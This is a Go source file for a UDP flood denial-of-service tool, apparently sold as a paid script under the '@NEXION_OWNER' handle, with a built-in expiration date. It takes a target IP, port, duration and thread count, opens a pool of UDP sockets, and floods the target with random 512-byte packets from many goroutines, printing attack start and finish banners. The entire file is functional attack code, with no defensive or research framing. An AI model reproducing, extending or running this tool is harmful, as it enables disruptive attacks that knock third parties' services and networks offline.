package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

// Constants
const (
	PayloadSize    = 512
	defaultThreads = 10
	maxThreads     = 1000
	expirationYear = 2024
	expirationMonth = time.December
	expirationDay  = 31
	batchSize      = 100 // Number of packets sent in each batch
)

// Display usage instructions
func usage() {
	fmt.Println("\nPAID SCRIPT BY :- @NEXION_OWNER")
	fmt.Println("SCRIPT OWNED BY @NEXION_OWNER")
	fmt.Println("\nUsage: ./nexion {ip} {port} {time} {threads optional}\n")
	os.Exit(1)
}

// Check if the script has expired
func checkExpiration() {
	expirationDate := time.Date(expirationYear, expirationMonth, expirationDay, 0, 0, 0, 0, time.UTC)
	if time.Now().After(expirationDate) {
		fmt.Println("\nThe script has expired and cannot be run.\n")
		os.Exit(1)
	}
}

// Validate IP address
func validateIP(ip string) bool {
	return net.ParseIP(ip) != nil
}

// Validate port range
func validatePort(port int) bool {
	return port > 0 && port <= 65535
}

// Pre-generate payloads
func generatePayloads(count int) [][]byte {
	payloads := make([][]byte, count)
	for i := 0; i < count; i++ {
		payload := make([]byte, PayloadSize)
		rand.Read(payload) // Fill with random bytes
		payloads[i] = payload
	}
	return payloads
}

// Attack function
func attack(ip string, port int, duration int, payloads [][]byte, connPool []*net.UDPConn, wg *sync.WaitGroup) {
	defer wg.Done()

	endTime := time.Now().Add(time.Duration(duration) * time.Second)
	for {
		if time.Now().After(endTime) {
			return
		}

		// Use pre-generated payloads and connection pool
		for _, conn := range connPool {
			for _, payload := range payloads {
				_, err := conn.Write(payload)
				if err != nil {
					fmt.Println("Error sending packet:", err)
					return
				}
			}
		}
	}
}

func main() {
	// Validate command-line arguments
	if len(os.Args) < 4 || len(os.Args) > 5 {
		usage()
	}

	checkExpiration() // Check for script expiration

	// Parse arguments
	ip := os.Args[1]
	if !validateIP(ip) {
		fmt.Println("Invalid IP address.")
		return
	}

	port, err := strconv.Atoi(os.Args[2])
	if err != nil || !validatePort(port) {
		fmt.Println("Invalid port.")
		return
	}

	duration, err := strconv.Atoi(os.Args[3])
	if err != nil || duration <= 0 {
		fmt.Println("Invalid time duration.")
		return
	}

	threads := defaultThreads
	if len(os.Args) == 5 {
		threads, err = strconv.Atoi(os.Args[4])
		if err != nil || threads <= 0 || threads > maxThreads {
			fmt.Println("Invalid number of threads. Must be a positive integer within range.")
			return
		}
	}

	// Display attack information
	fmt.Println("â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")
	fmt.Println("â ï¸ ATTACK START â ï¸")
	fmt.Printf("       IP: %s\n", ip)
	fmt.Printf("       PORT: %d\n", port)
	fmt.Printf("       TIME: %d seconds\n", duration)
	fmt.Printf("       THREADS: %d\n", threads)
	fmt.Println("â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")

	// Pre-generate payloads and connections
	payloads := generatePayloads(batchSize)
	var connPool []*net.UDPConn

	// Create a reusable connection pool
	for i := 0; i < threads; i++ {
		conn, err := net.DialUDP("udp", nil, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
		if err != nil {
			fmt.Println("Error creating socket:", err)
			return
		}
		connPool = append(connPool, conn)
	}

	// Launch attack
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attack(ip, port, duration, payloads, connPool, &wg)
	}

	wg.Wait() // Wait for all threads to finish

	// Close connections
	for _, conn := range connPool {
		conn.Close()
	}

	fmt.Println("â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")
	fmt.Println("     Attack finished")
	fmt.Println("â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬â¬")
}
